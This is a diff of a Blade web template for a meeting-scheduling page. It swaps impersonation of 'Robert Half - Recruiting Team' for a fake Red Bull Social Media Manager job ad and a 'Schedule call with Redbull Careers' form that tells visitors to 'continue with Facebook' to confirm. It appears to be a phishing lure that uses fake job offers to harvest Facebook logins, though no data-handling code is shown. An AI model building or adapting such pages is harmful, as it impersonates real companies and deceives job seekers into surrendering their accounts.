@@ -1,55 +1,48 @@
 <div>
+    <style>
+        .user__wrapper p{
+            font-size: 16px;
+            font-weight: normal;
+        }
+        .user__wrapper h1{
+            font-size: 48px;
+            text-align: center;
+            color: red;
+            margin: 0;
+            font-weight: bold;
+        }
+        .user__wrapper h2{
+            margin: 10px 0!important;
+        }
+    </style>
     <div id="root">
         <div class="App">
             <div class="box__shadow">
                 <div class="calendar__wrapper {{$webStatus ? '':'d-none'}}" >
                     <div class="user__wrapper">
-                        <div class="logo__wrapper"><img width="50%" src="{{asset('img/images.png')}}" /></div>
-                        <div class="screen__two center__text">
-                            <div class="mobile__back-svg">
-                                <div class="content__wrapper">
-                                    <div style="margin-bottom: 15px;">
-                                        <div><img class="avatar" width="65px" src="{{asset('img/logo.png')}}" /></div>
-                                    </div>
-                                    <h2>15 Minutes Meeting</h2>
-                                </div>
+                        <div style="padding: 20px">
+                            <div style="text-align: center"><img width="40%" src="{{asset('logos.svg')}}" /></div>
+                            <h1 style="">Social Media Manager</h1>
+                            <div style="text-align: center;margin-bottom: 15px;">
+                                <p><span>Location:</span> Remote | <span>Contract:</span> Permanent | <span>Salary:</span> Competitive + Benefits</p>
                             </div>
-                            <div class="minute">
-                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
-                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
-                                    <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
-                                </svg>
-                                <span>15 min</span>
-                            </div>
-                            <div class="minute mt-12">
-                                <svg data-testid="phone-call-icon" data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
-                                    <path
-                                        d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z"
-                                        fill="none"
-                                        stroke="currentColor"
-                                        stroke-linecap="round"
-                                        stroke-linejoin="round"
-                                    ></path>
-                                </svg>
-                                <span>Phone call</span>
-                            </div>
-                            <div class="minute space__bettwen">
-                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
-                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
-                                    <path
-                                        d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605"
-                                        fill="none"
-                                        stroke="currentColor"
-                                        stroke-linecap="round"
-                                        stroke-linejoin="round"
-                                    ></path>
-                                </svg>
-                                <span>US Georgia (00:59)</span>
-                            </div>
-                        </div>
-                        <div class="footer__wrapper">
-                            <p>Cookie settings</p>
-                            <p>Report abuse</p>
+                            <p>Red Bull is seeking a talented Social Media Manager to join our global team. In this role, you will lead the charge in developing and executing social media strategies that resonate with millions of fans worldwide.</p>
+                            <h2>Key Responsibilities:</h2>
+                            <p>Create and implement social media strategies across major platforms.</p>
+                            <p>Work with creative teams to design engaging content.</p>
+                            <p>Foster a community of loyal fans through active engagement.</p>
+                            <p>Track performance metrics and optimize campaigns.</p>
+                            <p>Collaborate with marketing and PR teams on integrated initiatives.</p>
+                            <h2>What We're Looking For:</h2>
+                            <p>3+ years of social media management experience.</p>
+                            <p>Strong knowledge of social platforms and trends.</p>
+                            <p>Creative mindset and excellent written communication skills.</p>
+                            <p>Passion for the Red Bull brand.</p>
+                            <h2>Why Red Bull?</h2>
+                            <p>Remote work opportunity.</p>
+                            <p>Permanent contract with growth opportunities.</p>
+                            <p>Competitive salary and benefits package.</p>
+                            <p>Work with a global, innovative team.</p>
                         </div>
                     </div>
                     <div  class="date__time {{$showCalender == false ? 'd-none':''}}">
@@ -86,7 +79,7 @@
                     <div class="form__wrapper date__time {{$showCalender ? 'd-none':''}}">
                         <div>
                             <div class="full__width">
-                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Robert Half - Recruiting Team</h2></div>
+                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Redbull Careers</h2></div>
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="form-steps">
                                         <form id="msform">
@@ -101,7 +94,7 @@
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="dummy__text">
                                         <p>
-                                            Please confirm your appointment with Robert Half - Recruiting Team. <br />
+                                            Please confirm your appointment with Redbull Careers. <br />
                                             To complete the confirmation process, continue with Facebook
                                         </p>
                                     </div>
@@ -143,52 +136,29 @@
                 </div>
                 <div class="calendar__wrapper {{$webStatus ? 'd-none':''}}" >
                     <div class="user__wrapper">
-                        <div class="logo__wrapper"><img width="50%" src="{{asset('img/images.png')}}" /></div>
-                        <div class="screen__two center__text">
-                            <div class="mobile__back-svg">
-                                <div class="content__wrapper">
-                                    <div style="margin-bottom: 15px;">
-                                        <div><img class="avatar" width="65px" src="{{asset('img/logo.png')}}" /></div>
-                                    </div>
-                                    <h2>15 Minutes Meeting</h2>
-                                </div>
+                        <div style="padding: 20px">
+                            <div style="text-align: center"><img width="40%" src="{{asset('logos.svg')}}" /></div>
+                            <h1 style="">Social Media Manager</h1>
+                            <div style="text-align: center;margin-bottom: 15px;">
+                                <p><span>Location:</span> Remote | <span>Contract:</span> Permanent | <span>Salary:</span> Competitive + Benefits</p>
                             </div>
-                            <div class="minute">
-                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
-                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
-                                    <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
-                                </svg>
-                                <span>15 min</span>
-                            </div>
-                            <div class="minute mt-12">
-                                <svg data-testid="phone-call-icon" data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
-                                    <path
-                                        d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z"
-                                        fill="none"
-                                        stroke="currentColor"
-                                        stroke-linecap="round"
-                                        stroke-linejoin="round"
-                                    ></path>
-                                </svg>
-                                <span>Phone call</span>
-                            </div>
-                            <div class="minute space__bettwen">
-                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
-                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
-                                    <path
-                                        d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605"
-                                        fill="none"
-                                        stroke="currentColor"
-                                        stroke-linecap="round"
-                                        stroke-linejoin="round"
-                                    ></path>
-                                </svg>
-                                <span>US Georgia (00:59)</span>
-                            </div>
-                        </div>
-                        <div class="footer__wrapper">
-                            <p>Cookie settings</p>
-                            <p>Report abuse</p>
+                            <p>Red Bull is seeking a talented Social Media Manager to join our global team. In this role, you will lead the charge in developing and executing social media strategies that resonate with millions of fans worldwide.</p>
+                            <h2>Key Responsibilities:</h2>
+                            <p>Create and implement social media strategies across major platforms.</p>
+                            <p>Work with creative teams to design engaging content.</p>
+                            <p>Foster a community of loyal fans through active engagement.</p>
+                            <p>Track performance metrics and optimize campaigns.</p>
+                            <p>Collaborate with marketing and PR teams on integrated initiatives.</p>
+                            <h2>What We're Looking For:</h2>
+                            <p>3+ years of social media management experience.</p>
+                            <p>Strong knowledge of social platforms and trends.</p>
+                            <p>Creative mindset and excellent written communication skills.</p>
+                            <p>Passion for the Red Bull brand.</p>
+                            <h2>Why Red Bull?</h2>
+                            <p>Remote work opportunity.</p>
+                            <p>Permanent contract with growth opportunities.</p>
+                            <p>Competitive salary and benefits package.</p>
+                            <p>Work with a global, innovative team.</p>
                         </div>
                     </div>
                     <div class="form__wrapper date__time  ">
